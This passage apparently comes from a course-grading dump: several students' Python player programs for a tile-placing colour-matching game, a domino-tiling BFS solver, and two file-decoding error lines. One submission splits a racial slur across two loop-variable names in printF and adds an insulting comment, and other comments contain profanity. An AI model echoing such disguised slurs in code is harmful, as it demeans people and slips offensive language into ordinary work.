        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Kanafasek"
        self.Deska = Board(boardRows, boardCols)
        self.CardCount = len(cardsAtHand)
        self.Ruka = []  
        for card in cardsAtHand:  
            original = Card(card)
            rotations = [deepcopy(original)]
            for _ in range(3):  
                rotated_card = deepcopy(rotations[-1])
                rotated_card.rotate()
                rotations.append(rotated_card)

            self.Ruka.append(rotations)

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position
        result = False
        if newCardOnDesk != []:
            #print(newCardOnDesk)
            self.Deska.place(newCardOnDesk[2],newCardOnDesk[0],newCardOnDesk[1])
            self.cardsOnDesk.append(newCardOnDesk)
        if self.Deska.placed == 0:
            rsltCard = [0,0]
            rsltCard += [self.Ruka[0][0].matrix]
            longest = 0
            result = True
            self.resultIndex = 0
        else:
            rsltCard = []
            longest = 0
            result = False
            self.resultIndex = 0
            t1 = time.time()
            for i in range(self.CardCount):   #nejdriv da nejakou kartu, aspon jednu nekam
                if result:
                    break
                for rot in range(len(self.Ruka[i])):
                    card = self.Ruka[i][rot]
                    height = card.height
                    width = card.width
                    for r in range(self.Deska.height-height+1):
                        if result:
                            break
                        for s in range(self.Deska.width-width+1):  #projizdi vsechny pole na desce
                            #print('trying triv r,s:', r, s)
                            #print('curr card h and w:', height, width)
                            if result: 
                                break
                            if (r+height > self.Deska.height) or (s+width > self.Deska.width): #kdyz bude moc na kraji tak se tam nevejde
                                continue
                            CanPlace = True
                            ShouldPlace = False
                            for cr in range(height):  #zkontroluje jestli tam vubec je misto
                                if CanPlace == False:
                                    break
                                for cs in range(width):
                                    if self.Deska.matrix[r+cr][s+cs] != 'X':
                                        CanPlace = False
                                        break
                            if CanPlace == False:
                                #print('cant place here')
                                #print('---------------')
                                continue

                            
                            if r-1 >= 0:
                                #print('zkoumam radek nad')
                                for j in range(width):
                                    if self.Deska.matrix[r-1][s+j] != 'X':
                                        ShouldPlace = True
                                        #print('shit overhead')
                                        break
                            if r+height+1 <= self.Deska.height:
                                #print('zkoumam radek pod')
                                for j in range(width):
                                    if self.Deska.matrix[r+height][s+j] != 'X':
                                        ShouldPlace = True
                                        #print('shit under')
                                        break
                            if s-1 >= 0:
                                #print('zkoumam radek vlevo')
                                for j in range(height):
                                    if self.Deska.matrix[r+j][s-1] != 'X':
                                        ShouldPlace = True
                                        #print('shit vlevo')
                                        break
                            if s+width+1 <= self.Deska.width:
                                #print('zkoumam radek vpravo')
                                for j in range(height):
                                    if self.Deska.matrix[r+j][s+width] != 'X':
                                        ShouldPlace = True
                                        #print('shit to the right')
                                        break
                            #print('---------------')
                            if ShouldPlace == True:
                                rsltCard = [deepcopy(card.matrix)]
                                rsltCard.insert(0,s)
                                rsltCard.insert(0,r)
                                result = True
                                self.resultIndex = i
            if self.tournament or True:  
                for i in range(self.CardCount): #projizdi vsechny karty v ruce
                        #print(i, self.CardCount)
                        for rot in range(len(self.Ruka[i])):
                            card = self.Ruka[i][rot]
                            #print('this is the error', card)
                            #print(i, rot, self.Ruka)
                            height = card.height
                            width = card.width
                            for r in range(self.Deska.height-height+1):
                                for s in range(self.Deska.width-width+1):  #projizdi vsechny pole na desce
                                    #print('trying r,s:', r, s)
                                    #print('curr card h and w:', height, width)
                                    if (r+height > self.Deska.height) or (s+width > self.Deska.width): #kdyz bude moc na kraji tak se tam nevejde
                                        continue #a continue to skipne na dalsi beh a break ukonci celej ten sloupec..
                                    CanPlace = True
                                    ShouldPlace = False
                                    IsClose = False

                                    if r-1 >= 0 and not IsClose:
                                        #print('zkoumam radek nad')
                                        for j in range(width):
                                            if self.Deska.matrix[r-1][s+j] != 'X':
                                                IsClose = True
                                                #print('shit overhead')
                                                break
                                    if r+height+1 <= self.Deska.height and not IsClose:
                                        #print('zkoumam radek pod')
                                        for j in range(width):
                                            if self.Deska.matrix[r+height][s+j] != 'X':
                                                IsClose = True
                                                #print('shit under')
                                                break
                                    if s-1 >= 0 and not IsClose:
                                        #print('zkoumam radek vlevo')
                                        for j in range(height):
                                            if self.Deska.matrix[r+j][s-1] != 'X':
                                                IsClose = True
                                                #print('shit vlevo')
                                                break
                                    if s+width+1 <= self.Deska.width and not IsClose:
                                        #print('zkoumam radek vpravo')
                                        for j in range(height):
                                            if self.Deska.matrix[r+j][s+width] != 'X':
                                                IsClose = True
                                                #print('shit to the right')
                                                break
                                    if IsClose:
                                        for cr in range(height):  #zkontroluje jestli tam vubec je misto
                                            if CanPlace == False:
                                                break
                                            for cs in range(width):
                                                if self.Deska.matrix[r+cr][s+cs] != 'X':
                                                    CanPlace = False
                                                    break
                                        if CanPlace == False:
                                            #print('cant place here')
                                            #print('---------------')
                                            continue
                                        self.Deska.place(card.matrix,r,s)
                                        Floodfill_starters = []
                                        if r-1 >= 0:
                                            #print('zkoumam radek nad')
                                            for j in range(width):
                                                MySOI = self.Deska.matrix[r-1][s+j]
                                                CrdSq = self.Deska.matrix[r][s+j]
                                                if MySOI == CrdSq and CrdSq != 0:
                                                    ShouldPlace = True
                                                    Floodfill_starters.append((r,s+j))
                                                    #print('shit overhead matches', (r-1,s+i), (r,s+i) )
                                                    
                                        if r+height+1 <= self.Deska.height:
                                            #print('zkoumam radek pod')
                                            for j in range(width):
                                                MySOI = self.Deska.matrix[r+height][s+j]
                                                CrdSq = self.Deska.matrix[r+height-1][s+j]
                                                if MySOI == CrdSq and CrdSq != 0:
                                                    ShouldPlace = True
                                                    Floodfill_starters.append((r+height-1,s+j))
                                                    #print('shit under matches',(r+height,s+i),(r+height-1,s+i), 'stejny jsou:', MySOI, CrdSq)
                                        
                                        if s-1 >= 0:
                                            #print('zkoumam sloupec vlevo')
                                            for j in range(height):
                                                MySOI = self.Deska.matrix[r+j][s-1]
                                                CrdSq = self.Deska.matrix[r+j][s]
                                                if MySOI == CrdSq and CrdSq != 0:
                                                    ShouldPlace = True
                                                    Floodfill_starters.append((r+j,s))
                                                    #print('shit vlevo matches',(r+i,s-1),(r+i,s) )
                                        if s+width+1 <= self.Deska.width:
                                            #print('zkoumam sloupec vpravo')
                                            for j in range(height):
                                                MySOI = self.Deska.matrix[r+j][s+width]
                                                CrdSq = self.Deska.matrix[r+j][s+width-1]
                                                if MySOI == CrdSq and CrdSq != 0:
                                                    ShouldPlace = True
                                                    Floodfill_starters.append((r+j,s+width-1))
                                                    #print('shit vpravo matches',(r+i,s+width), (r+i,s+width-1) )
                                        #print('---------------')
                                        if ShouldPlace == True:
                                            score = 0
                                            for coords in Floodfill_starters:
                                                CurrColor = self.Deska.matrix[coords[0]][coords[1]]
                                                if CurrColor != '*':
                                                    score += floodfill(self.Deska.matrix,coords[0],coords[1])
                                            if score >= longest:
                                                rsltCard = [deepcopy(card.matrix)]
                                                rsltCard.insert(0,s)
                                                rsltCard.insert(0,r)
                                                result = True
                                                longest = score
                                                self.resultIndex = i
                                        self.Deska.undo()
            
        if result:
            #print(self.Ruka[self.resultIndex][0].matrix)
            #print('tady vysledek', rsltCard)
            self.Deska.place(rsltCard[2],rsltCard[0],rsltCard[1])
            '''
            print('ruka pred odebranim karty')
            for i in range(self.CardCount):
                print('////////////////index', i)
                for j in range(4):
                    MPrint(self.Ruka[i][j].matrix)
                    print('------------')
            '''
            self.CardCount -= 1
            self.Ruka.pop(self.resultIndex)
            '''
            print('odebiram kartu s indexem:', self.resultIndex)
            print('je to tato karta: ')
            MPrint(rsltCard[2])

            print('ruka po odebrani karty')
            for i in range(self.CardCount):
                print('////////////////index', i)
                for j in range(4):
                    MPrint(self.Ruka[i][j].matrix)
                    print('------------')
            '''
            self.cardsOnDesk.append(rsltCard)
            return rsltCard
        else:
            return []


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1
    tmp1 = deepcopy(tmp)
    tmp2 = deepcopy(tmp)
    p1 = Player("testA", 19, 23, tmp1)
    p2 = Player("testB", 19, 23, tmp2)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    jindrvo2
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/jindrvo2______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Show-Reck"
        self.cardsOnDesk = []
        self.maxTime = 1.450
        self.board = Board (boardRows, boardCols, self.maxTime)
        self.cardsAtHand = []
        

        for card in cardsAtHand:
            self.cardsAtHand.append (Card (card))

    def play(self, newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """
        startTime = time.time ()
        

        if newCardOnDesk:
            self.board.card_on_board (newCardOnDesk [2], newCardOnDesk [0], newCardOnDesk [1])
            self.cardsOnDesk.append (newCardOnDesk)

        self.board.searched.clear ()
        highest = [-1, 'row', 'column', 'cardMatrix']
        for card in self.cardsAtHand:
            for rotations in range (4):
                if rotations > 0:
                    card.rotate ()
                places = self.board.find_place (card)
                    
                for place in places:
                    score = self.board.eval_score (card, place [0], place [1])
                    if score > highest [0]:
                        highest = [score, place [0], place [1], card.matrix, card]
                    if (time.time () - startTime) >= self.maxTime:
                        self.board.card_on_board (highest [3], highest [1], highest [2])
                        self.cardsOnDesk.append (highest [1:4])
                        self.cardsAtHand.pop (self.cardsAtHand.index (highest [4]))
                        return highest [1:4]
                        
        if highest [0] != -1:
            self.board.card_on_board (highest [3], highest [1], highest [2])
            self.cardsOnDesk.append (highest [1:4])
            self.cardsAtHand.pop (self.cardsAtHand.index (highest [4]))
            return highest [1:4]
            
        return []

class Card:
    def __init__ (self, cardMatrix):
        self.R = len (cardMatrix)
        self.C = len (cardMatrix [0])
        self.matrix = copy.deepcopy (cardMatrix)
    
    def rotate (self):
        R = len (self.matrix)
        C = len (self.matrix [0])
        newCard = []

        for _ in range (C):
            newCard.append ([0] * R)

        for r in range (R):
            for c in range (C):
                newCard [c][(R - r) - 1] = self.matrix [r][c] 
        
        self.R, self.C = C, R
        self.matrix = copy.deepcopy (newCard)
    
class Board:
    def __init__ (self, R, C, maxTime):
        self.maxTime = maxTime
        self.board = []
        self.cardsOnDesk = []
        self.R = R
        self.C = C
        self.searched = {}
        for i in range (self.R):
            self.board.append ([-1] * self.C)

    def is_empty (self, r, c):
            if r >= self.R or r < 0 or c >= self.C or c < 0:
                return False
            if self.board [r][c] != -1:
                return False
            return True
    
    def mark (self, r, c):
        self.board [r][c] = '!'

    def card_on_board (self, cardMatrix, r, c):  # card je pole, ktere ma na zacatku pozici (dve polozky), pak radkovou interpretaci karty
        R = len (cardMatrix)
        C = len (cardMatrix [0])
        
        for row in range (R):
            for column in range (C):
                self.board [r + row][c + column] = cardMatrix [row][column]

        self.cardsOnDesk.append ([r, c, cardMatrix])

    def find_place (self, card):
        legalPlaces = []
        R = card.R
        C = card.C 
        
        if not self.cardsOnDesk:
            return [[len (self.board) // 2 - R // 2, len (self.board [0]) // 2 - C // 2]]
        
        if str ([R, C]) in self.searched:
            return self.searched [str ([R, C])]
        
        for card in self.cardsOnDesk:
            possiblePlaces = []
            cornerR = card [0]
            cornerC = card [1]
            cardR = len (card [2])
            cardC = len (card [2][0])

            for c in range (cornerC - C + 1, cornerC + cardC):
                r = cornerR - R
                if self.is_empty (r, c):
                    possiblePlaces.append ([r, c])

            for r in range (cornerR - R + 1, cornerR + cardR):
                c = cornerC - C
                if self.is_empty (r, c):
                    possiblePlaces.append ([r, c])

            for c in range (cornerC - C + 1, cornerC + cardC):
                r = cornerR + cardR
                if self.is_empty (r, c):
                    possiblePlaces.append ([r, c])

            for r in range (cornerR - R + 1, cornerR + cardR):
                c = cornerC + cardC
                if self.is_empty (r, c):
                    possiblePlaces.append ([r, c])

            for place in possiblePlaces:
                r = place [0]
                c = place [1]
                unwanted = False

                if [r, c - 1] in legalPlaces:
                    cCoord = c + C -1
                    for row in range (R):
                        if not self.is_empty (r + row, cCoord):
                            unwanted = True
                            break
                    if not unwanted:
                        legalPlaces.append (place)
                    continue
                
                if [r - 1, c] in legalPlaces:
                    rCoord = r + R - 1
                    for column in range (C):
                        if not self.is_empty (rCoord, c + column):
                            unwanted = True
                            break
                    if not unwanted:
                        legalPlaces.append (place)
                    continue
                
                for row in range (R):
                    for column in range (C):
                        if not self.is_empty (r + row, c + column):
                            unwanted = True
                            break
                    if unwanted:
                        break
                if unwanted:
                    continue

                legalPlaces.append (place)

        self.searched [str ([R, C])] = legalPlaces
        return legalPlaces

    def eval_score (self, card, r, c):
        evalBoard = copy.deepcopy (self.board)
        height = card.R
        width = card.C
        for row in range (height):
            for column in range (width):
                evalBoard [r + row][c + column] = card.matrix [row][column]
        
        color = 1
        scoreCount = 0

        while color <= 4:
            start = self.find_in_card (evalBoard, card, r, c, color) #start je pole, ktere obsahuje pozici dane barvy
            
            if start == []:
                color += 1
                continue

            stack = [start]
            known = [start]
            score = False
            colorScore = 0

            while stack:
                coords = stack.pop ()
                row = coords [0]
                column = coords [1]

                if evalBoard [row][column] == color:
                    evalBoard [row][column] = 0

                    if row <= (r - 1) or row >= (r + height) or column <= (c - 1) or column >= (c + width):
                        score = True

                    if row - 1 >= 0 and [row - 1, column] not in known:
                        stack.append ([row - 1, column])
                        known.append ([row - 1, column])

                    if row + 1 < len (evalBoard) and [row + 1, column] not in known:
                        stack.append ([row + 1, column])
                        known.append ([row + 1, column])

                    if column + 1 < len (evalBoard [row]) and [row, column + 1] not in known:
                        stack.append ([row, column + 1])
                        known.append ([row, column + 1])

                    if column - 1 >= 0 and [row, column - 1] not in known:
                        stack.append ([row, column - 1])
                        known.append ([row, column - 1])

                    colorScore += 1

            if score:
                scoreCount += colorScore

        return scoreCount

    def find_in_card (self, board, card, r, c, querry):
        height = card.R
        width = card.C
        for row in range (r, r + height):
            for column in range (c, c + width):
                if board [row][column] == querry:
                    return [row, column]
        return []

if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    mullelu3
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/mullelu3______________________
        player.py
import base as BASE
import copy, random, time, sys, os
#from PIL import Image, ImageDraw
#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def printF(Field):
    for nig in Field:
        for ger in nig:
            print(ger,end = " ")
        print()

def contror(mat,x,y,a,b): #probler you stupid n
    N = [[0,1],[1,0],[0,-1],[-1,0]]
    counter = 0
    for i in range(a):
        for j in range(b):
            if y + j >= 0 and x + i < len(mat) and x + i >= 0 and y + j < len(mat[0]):
                if mat[x+i][y+j] != "X":
                    return False
            else:
                return False
            for s in range(len(N)):
                c, d = N[s]
                if i == 0 or j == 0 or i == a-1 or j == b-1:
                    if y + j + d >= 0 and x + i + c < len(mat) and x + i + c >= 0 and y + j + d < len(mat[0]):
                        if mat[x+i+c][y+j+d] != "X":
                            counter = counter + 1
    if counter > 0:
        return True
    return False
def placeCar(mat,a,b,car):
    for i in range(len(car)):
        for j in range(len(car[0])):
            mat[a+i][b+j] = car[i][j]
    return mat

def rotat(car):
    mag = [0] * len(car[0])
    for i in range(len(car[0])):
        tempM = []
        for j in range(len(car)):
            tempM.append(car[j][i])
        mag[len(car[0])-i-1] = tempM
    return mag

class Player(BASE.BasePlayer):

    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "e/er"

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """
        board = [["X"]*self.boardCols for _ in range(self.boardRows)]
        if not newCardOnDesk in self.cardsOnDesk:
            if newCardOnDesk:
                if len(newCardOnDesk) == 3:
                    self.cardsOnDesk += [ newCardOnDesk ]
        if len(self.cardsAtHand) == 0:
            return []
        for etwas in self.cardsOnDesk:
            board = placeCar(board,etwas[0],etwas[1],etwas[2])
        #printF(board)

        if len(self.cardsOnDesk) == 0:
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            a = random.randint(0, self.boardRows-cardRows-1) 
            b = random.randint(0, self.boardCols-cardCols-1)
            card = self.cardsAtHand[cardindx]
            self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]
            self.cardsOnDesk += [[a, b, card]]
            return [a, b, card] 
        else:
            for a in range(self.boardRows):
                for b in range(self.boardCols):
                    if board[a][b] == "X":
                        for c in range(len(self.cardsAtHand)):
                            d = len(self.cardsAtHand[c])
                            e = len(self.cardsAtHand[c][0])
                            if contror(board,a,b,d,e):
                                cardindx = c
                                card = self.cardsAtHand[cardindx]
                                self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]
                                self.cardsOnDesk += [[a, b, card]]
                                return [a, b, card] 
                            elif contror(board,a,b,e,d):
                                cardindx = c
                                card = rotat(self.cardsAtHand[cardindx])
                                self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]
                                self.cardsOnDesk += [[a, b, card]]
                                return [a, b, card]
        return []
if 0:
    if __name__ == "__main__":
        """ when you run:
            python3 player.py

            you should get set of .png files with the progress of the game
        """

        tmp = [C44a, C44b, C33a, C33c, C53c, C53b]*1

        p1 = Player("testA", 9, 13, tmp)
        p2 = Player("testB", 9, 13, tmp)

        p2move = []
        gameStep = 0
        while True:
            p1move = p1.play(p2move)
            print("p1 returned", p1move)
            #p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

            p2move = p2.play(p1move)    
            print("p2 returned", p2move)
            #p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
            gameStep += 1
            if p1move == [] and p2move == []:
                print("end of game")
                quit()

    preslteo
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/preslteo______________________
        domino.py
import sys
import time

cas1 = time.time()

f = open(sys.argv[1],"rt")
#f = open("vstup1.txt","rt")

poleDomino = []
for line in f:
    poleDomino.append(list(map(str, line.split())))
f.close()

f = open(sys.argv[2],"rt")
#f = open("vstup2.txt","rt")

poleKostek = []
for line in f:
    poleKostek.append(list(map(str, line.split())))
f.close()

def matrixprint2D(matice):
    for i in range(len(matice)):
        print(matice[i])

def matrixcreate2D(radky,sloupce):
    matrix = []
    for i in range(radky):
        matrix.append([0]*sloupce)
    return matrix

def matrixcopy2D(matrix):
    matrixcopy = [v[:] for v in matrix]
    return matrixcopy


def matrixrotate2D(matice):
    rotovana = matrixcreate2D(len(matice[0]),len(matice)) #chci vytvorit s prohozenym poctem radku a sloupcu
    for y in range(len(rotovana)): #radky
        for x in range(len(rotovana[0])): #sloupce
            opacney = len(matice) - 1 - x
            opacnex = y
            rotovana[y][x] = matice[opacney][opacnex]
    return rotovana


class Fronta:
    def __init__(self):
        self.items = []
    def add(self,item):
        self.items.insert(0,item)
    def get(self):
        return self.items.pop()
    def isEmpty(self):
        return self.items == []

#matrixprint2D(poleDomino)
#matrixprint2D(poleKostek)

#fce hledac prostoru, najde misto kam jde dat kostka
#pak akce ktera na ono misto priradi mozne kostky a vrati pole v ktrem lezi
#pak jeste fci ktera zkontroluje spravnost pole (melo by stacit ze je zaplnene)

def ctyrokoli(matrix,YX,podminka): #YX = (y,x) podminka = list hodnot co chci najit
    coord = [[0,-1],[-1,0],[0,1],[1,0]] #Leva, Nahore, Prava, Dole
    vysledek = []
    Y = YX[0]
    X = YX[1]
    for i in coord:
        coordy = Y + i[0]
        coordx = X + i[1]
        if coordy < 0 or coordy > (len(matrix) -1) or coordx < 0 or coordx > (len(matrix[0])-1):
            continue
        if matrix[coordy][coordx] in podminka:
            vysledek.append(i)
    if vysledek == []:
        return None
    return vysledek

def ctyrokolinum(matrix,YX):
    coord = [[0, -1], [-1, 0], [0, 1], [1, 0]]  # Leva, Nahore, Prava, Dole
    vysledek = []
    Y = YX[0]
    X = YX[1]
    for i in coord:
        coordy = Y + i[0]
        coordx = X + i[1]
        if coordy < 0 or coordy > (len(matrix) - 1) or coordx < 0 or coordx > (len(matrix[0]) - 1):
            continue
        if matrix[coordy][coordx].isnumeric():
            vysledek.append(i)
    if vysledek == []:
        return None
    return vysledek


def hledacProstoru(pole): # [Y,X,Y,X,Y,X] YX1 = policko ke kteremu prikladam  YX2 = prvni polovina kosticky YX3 = druha polovina kosticky
    vysledek = []
    for y in range(len(pole)):
        for x in range(len(pole[0])):
            if pole[y][x].isnumeric():
                okoli = ctyrokoli(pole,[y,x],"o")
                if okoli == None:
                    continue
                for i in okoli:
                    coordy = y + i[0]
                    coordx = x + i[1]
                    okoli2 = ctyrokoli(pole,[coordy,coordx],"o")
                    if okoli2 != None:
                        for z in okoli2:
                            coordy2 = coordy + z[0]
                            coordx2 = coordx + z[1]
                            vysledek.append([y,x,coordy,coordx,coordy2,coordx2])
    return vysledek

#matrixprint2D(hledacProstoru(poleDomino))

#fce ktera vrati ktere kostky jdou prilozit na dane misto
#bez ohledu na rotace ty budu zkouset pozdeji

def kostkarotator(kostka):
    vysledek = []
    for i in range(4):
        kostka = matrixrotate2D(kostka)
        vysledek.append(kostka)
    return vysledek

#matrixprint2D(kostkarotator(poleKostek[1]))

def listremover(remove,list):
    remover = []
    for i in range(len(list)):
        if list[i] == remove:
            remover = i
            break
    list.pop(remover)
    return list

#matrixprint2D(ctyrokolinum(poleDomino,[2,0]))

#fce ktera vrati pole vsech moznych prilozeni kostek a k nim pole upravene pole kostek
def kostkovac(poleDominoin, poleKostekin):
    vysledek = []
    for misto in hledacProstoru(poleDominoin):
        for kostka in poleKostekin:

            if not poleDominoin[misto[0]][misto[1]] in kostka: #12s bez 22,5s
                continue

            for rotacekostky in kostkarotator(kostka):
                test = True
                shiftY = abs(misto[2] - misto[4])
                shigtX = abs(misto[3] - misto [5])
                #staci zjistit jestli je kostka dost dlouha, jinak bude dost vysoka
                if poleDominoin[misto[0]][misto[1]] == rotacekostky[0][0] and len(rotacekostky) -1 == shiftY:

                    #jeste zjistim jestli konec kostky nebude porusovat pravidla
                    #zacatek kostky
                    okolinum = ctyrokolinum(poleDominoin, [misto[2], misto[3]])
                    if okolinum != None: #kdyz konec kostky muze byt k necemu prilozen
                        #print("checkzacatku")
                        for smth in okolinum:
                            coordy = misto[2] + smth[0]
                            coordx = misto[3] + smth[1]
                            if rotacekostky[0][0] != poleDominoin[coordy][coordx]:
                                test = False
                                break
                    if test == False:
                        continue
                    #konec kostky
                    okolinum = ctyrokolinum(poleDominoin, [misto[4], misto[5]])
                    if okolinum != None: #kdyz konec kostky muze byt k necemu prilozen
                        #print("checkkonce")
                        for smth in okolinum:
                            coordy = misto[4] + smth[0]
                            coordx = misto[5] + smth[1]
                            if shiftY > 0:
                                if rotacekostky[1][0] != poleDominoin[coordy][coordx]:
                                    test = False
                                    break
                            else:
                                if rotacekostky[0][1] != poleDominoin[coordy][coordx]:
                                    test = False
                                    break

                    if test == False:
                        continue
                    tmppoleDomino = matrixcopy2D(poleDominoin)
                    tmppoleKostek = matrixcopy2D(poleKostekin)
                    tmppoleDomino[misto[2]][misto[3]] = rotacekostky[0][0]
                    if shiftY > 0:
                        tmppoleDomino[misto[4]][misto[5]] = rotacekostky[1][0]
                    else:
                        tmppoleDomino[misto[4]][misto[5]] = rotacekostky[0][1]
                    #tmppoleKostek = tmppoleKostek.remove(kostka)
                    tmppoleKostek = listremover(kostka,tmppoleKostek)
                    vysledek.append([tmppoleDomino,tmppoleKostek])
    return vysledek
#zda se ze facha
stavy = kostkovac(poleDomino,poleKostek)
#matrixprint2D(stavy[0][0])
#matrixprint2D(stavy[0][1])

def cil(pole):
    for y in range(len(pole)):
        for x in range(len(pole[0])):
            if pole[y][x] == "o":
                return False
    return True

def lstnahash(lst):
    return hash(str(lst))


def BFSstavoveBezCesty(poleDomino,poleKostek): #stav ma 2 casti [0] je pole domino [1] je pole kostek
    start = []
    start.append(poleDomino)
    start.append(poleKostek)
    f = Fronta()
    f.add(start)
    known = {}
    known[lstnahash(start)] = True

    while not f.isEmpty():
        stav = f.get()
        for soused in kostkovac(stav[0],stav[1]): #sousedni stavy je funkce akci co je mozne vykonat
            if not lstnahash(soused) in known:
                known[lstnahash(soused)] = True
                f.add(soused)
                if cil(soused[0]):
                    return soused[0]
        #if cil(stav[0]): #ukoncovaci podminka
            #return stav[0]

def RomanuvMaticoTisk(matice):
    for i in range(len(matice)):
        for a in range(len(matice[i])):
            #matice[i][a]
            x = matice[i][a]
            if x == "N":
                x = "."
            print(x,end=" ")
        print()
    return ""

RomanuvMaticoTisk(BFSstavoveBezCesty(poleDomino,poleKostek))
#cas2 = time.time()
#print("runtime: " + str(cas2 - cas1))        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 1302: ordinal not in range(128)    kadrnma1
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kadrnma1______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 1167: ordinal not in range(128)    dedekvac
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/dedekvac______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw

#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Vasek008"

        self.hraciDeska = [[9]*self.boardCols for _ in range(self.boardRows)]
        self.edgePositions = set()
        self.isFree = [[True]*self.boardCols for _ in range(self.boardRows)]

        self.cardCount = len(cardsAtHand)
        for i in range(self.cardCount):
            cardsAtHand.insert(4*i+1, self.rotation(cardsAtHand[4*i]))
            cardsAtHand.insert(4*i+1, self.rotation(self.rotation(cardsAtHand[4*i])))
